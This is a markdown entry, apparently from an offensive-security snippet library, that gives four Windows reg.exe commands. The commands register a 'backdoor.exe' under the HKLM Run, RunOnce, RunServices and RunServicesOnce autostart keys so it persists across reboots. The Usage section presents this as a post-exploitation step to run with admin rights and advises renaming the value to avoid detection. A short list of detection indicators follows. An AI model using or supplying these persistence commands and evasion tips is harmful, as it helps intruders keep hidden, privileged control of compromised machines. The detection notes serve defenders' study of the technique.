---
type: code
language: cmd
verified: true
platforms:
  - Windows
tags:
  - persistence
  - registry
  - batch
validated: true
---

# cmd-multiple-registry-persistence-adds

## Code

```cmd
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
```

## Description

This code snippet is a sequence of reg.exe commands that add persistence entries to multiple Windows autostart registry keys (Run, RunOnce, RunServices, RunServicesOnce) in the HKLM hive, ensuring the backdoor executable runs under various startup conditions with elevated privileges.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Evil (in /v) | Hard-coded value name; replace with custom name like Backdoor | Evil |
| C:\tmp\backdoor.exe (in /d) | Hard-coded executable path; replace with actual payload location | C:\tmp\backdoor.exe |

## Usage

Save the code as a .bat file and execute in an elevated Command Prompt, or run line-by-line. Used in post-exploitation for redundant persistence after gaining admin access. Edit the value name and path before running to avoid detection from generic names like 'Evil'.

## Detection

- Monitor registry changes via Windows Event Logs (Event ID 4657 for registry value set).
- EDR alerts on modifications to autostart keys or execution of reg.exe with HKLM paths.
- Behavioral detection of multiple similar registry adds in a short time or unknown executables in startup locations.

## Related

- [[procedures/Windows-Registry-HKLM-Run-Key-Persistence]]
